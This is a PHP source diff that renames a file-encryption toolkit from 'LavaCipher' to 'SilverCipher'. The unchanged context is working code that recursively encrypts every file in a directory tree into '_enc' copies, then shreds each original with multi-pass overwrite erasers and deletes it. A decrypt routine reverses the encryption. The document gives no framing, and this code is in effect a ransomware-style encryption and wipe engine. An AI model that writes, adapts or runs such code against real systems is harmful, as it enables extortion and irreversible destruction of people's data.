@@ -1,6 +1,6 @@
 <?php 
 set_time_limit(0);
-class LavaCipher
+class SilverCipher
 {
     private $iv;
     private $key;
@@ -24,7 +24,7 @@ class LavaCipher
                 $file_path = $dir . DIRECTORY_SEPARATOR . $file;
 
                 if (is_dir($file_path)) {
-                    $ht1 = new LavaCipher($this->key, $this->iv);
+                    $ht1 = new SilverCipher($this->key, $this->iv);
                     $ht1->encrypt_data("folder", null, $algorithm, $file_path);
                 } else {
                     if (substr($file, -4) === "_enc") {
@@ -34,12 +34,12 @@ class LavaCipher
                     if (empty($file_content)) {
                         file_put_contents($file_path . "_enc","");
                         file_put_contents($file_path, openssl_random_pseudo_bytes(32));
-                        LavaCipherEraser::Eraser3($file_path);
+                        SilverCipherEraser::Eraser3($file_path);
                         continue;
                     }
                     $encrypted_content = openssl_encrypt($file_content, $algorithm, $this->key, $options, $this->iv);
                     file_put_contents($file_path . "_enc", $encrypted_content);
-                    LavaCipherEraser::Eraser3($file_path);
+                    SilverCipherEraser::Eraser3($file_path);
                 }
             }
         }else if ($type == "file") {
@@ -48,12 +48,12 @@ class LavaCipher
                 if (empty($file_content)) {
                     file_put_contents($data . "_enc","");
                     file_put_contents($data, openssl_random_pseudo_bytes(32));
-                    LavaCipherEraser::Eraser3($data);
+                    SilverCipherEraser::Eraser3($data);
                     return;
                 }
                 $encrypted_content = openssl_encrypt($file_content, $algorithm, $this->key, $options, $this->iv);
                 file_put_contents($data . "_enc", $encrypted_content);
-                LavaCipherEraser::Eraser3($data);
+                SilverCipherEraser::Eraser3($data);
             } else {
                 echo "Error: The file does not exist!";
             }
@@ -78,7 +78,7 @@ class LavaCipher
             foreach ($files as $file) {
                 $file_path = $dir . DIRECTORY_SEPARATOR . $file;
                 if (is_dir($file_path)) {
-                    $ht2 = new LavaCipher($this->key, $this->iv);
+                    $ht2 = new SilverCipher($this->key, $this->iv);
                     $ht2->decrypt_data("folder", null, $algorithm, $file_path);
                 } else {
                     if (substr($file, -4) !== "_enc") {
@@ -87,7 +87,7 @@ class LavaCipher
                     $file_content = file_get_contents($file_path);
                     if (empty($file_content)) {
                         file_put_contents(substr($data, 0, -4), "");
-                        LavaCipherEraser::Eraser3($data);
+                        SilverCipherEraser::Eraser3($data);
                         continue;
                     }
                     try {
@@ -100,7 +100,7 @@ class LavaCipher
                         continue;
                     }
                     file_put_contents(substr($file_path, 0, -4), $decrypted_content);
-                    LavaCipherEraser::Eraser3($file_path);
+                    SilverCipherEraser::Eraser3($file_path);
                 }
             }
         } else if ($type == "file") {
@@ -108,7 +108,7 @@ class LavaCipher
                 $file_content = file_get_contents($data);
                 if (empty($file_content)) {
                     file_put_contents(substr($data, 0, -4), "");
-                    LavaCipherEraser::Eraser3($data);
+                    SilverCipherEraser::Eraser3($data);
                     return;
                 }
                 try {
@@ -121,7 +121,7 @@ class LavaCipher
                     return;
                 }
                 file_put_contents(substr($data, 0, -4), $decrypted_content);
-                LavaCipherEraser::Eraser3($data);
+                SilverCipherEraser::Eraser3($data);
             } else {
                 echo "Error: The file does not exist!";
                 return;
@@ -161,7 +161,7 @@ class LavaCipher
         return $b;
     }
 }
-class LavaCipherEraser
+class SilverCipherEraser
 {
 public static function Eraser1($filename){if(!file_exists($filename)){return false;}$file=fopen($filename,"w");for($i=0;$i<35;$i++){$data='';for($j=0;$j<filesize($filename);$j++){$data.=chr(mt_rand(0,255));}fwrite($file,$data);fflush($file);fseek($file,0);}for($i=0;$i<filesize($filename);$i++){fwrite($file,"\x00");fflush($file);fseek($file,0);}for($i=0;$i<filesize($filename);$i++){fwrite($file,"\xFF");fflush($file);fseek($file,0);}fclose($file);unlink($filename);}
 public static function Eraser2($filename){if(!file_exists($filename)){return false;}$size=filesize($filename);if(!$size||!is_writable($filename)){return false;}$patterns=array("\x00\xFF","\xFF\x00","\x55\xAA","\xAA\x55","\x92\x49","\x49\x92","\x24\x92","\x92\x24","\x6D\xB6","\xB6\x6D","\xDB\xDB","\x6D\xB6","\xFF\xFF","\x00\x00","\x11\x11","\x22\x22","\x33\x33","\x44\x44","\x55\x55","\x66\x66","\x77\x77","\x88\x88","\x99\x99","\xAA\xAA","\xBB\xBB","\xCC\xCC","\xDD\xDD","\xEE\xEE","\xFF\xFF","\x00\x00","\x00\x00","\xFF\xFF","\xAA\xAA","\x55\x55","\x00\x00","\xFF\xFF","\x00\x00","\xFF\xFF","\x55\x55","\xAA\xAA","\xFF\xFF","\x00\x00","\xAA\xAA","\x55\x55","\xFF\xFF","\x00\x00","\x55\x55","\xAA\xAA");$pattern_count=count($patterns);for($i=0;$i<5;$i++){$pattern=$patterns[$i%$pattern_count];$handle=fopen($filename,"w");for($j=0;$j<$size;$j+=strlen($pattern)){fwrite($handle,$pattern,strlen($pattern));}fclose($handle);}unlink($filename);return true;}
